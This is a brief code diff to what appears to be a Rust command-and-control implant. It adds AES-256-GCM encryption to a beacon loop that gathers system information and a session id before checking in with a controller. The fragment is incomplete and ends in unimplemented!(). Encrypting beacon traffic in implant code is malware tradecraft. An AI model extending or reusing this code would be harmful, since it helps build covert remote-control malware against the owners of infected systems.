@@ -312,6 +312,10 @@ pub unsafe fn beacon_loop(config: &C2Config) {
         // Build beacon data
         let beacon_json = build_beacon_json(&session_id, &sysinfo);
         debug!("[BEACON] Checkin ({} bytes plaintext)", beacon_json.len());
+    
+        // Encrypt 
+        let encrypted = crypto::aes256_gcm_encrypt(&key, &beacon_json);
+
     }
     unimplemented!()
 }
